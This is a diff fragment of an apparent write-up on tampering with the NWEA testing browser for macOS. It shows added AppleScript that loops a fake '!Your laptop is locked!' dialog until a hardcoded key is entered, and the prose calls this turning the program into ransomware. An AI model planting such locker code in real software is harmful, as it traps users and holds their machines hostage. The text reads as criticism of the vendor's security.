@@ -24,21 +24,25 @@ Nothing, only eight lines of code have been added.
 Code added to "QuitProcesses.applescript":
 
 
-repeat
+Code:
 
-	set protectCode to display dialog "!Your laptop is locked! !Enter Key!" default answer "" buttons {"Unlock With Key"}
+
+	repeat
 	
-	if text returned of protectCode is "ioZevo#^Github" then
+		set protectCode to display dialog "!Your laptop is locked! !Enter Key!" default answer "" buttons {"Unlock"}
 	
-		tell application "nwea browser exploited"
+		if text returned of protectCode is "ioZevo#^Github" then
+	
+			tell application "nwea browser exploited"
 		
-			quit
+				quit
 			
-		end tell
+			end tell
 	
-	end if
+		end if
 	
-end repeat
+	end repeat
+	
 
 Sadly NWEA has done a horrible job of securing their code, making it easy to convert their program
 into simple Ransomeware. The Sparkle framework, which includes a function to check if code has been
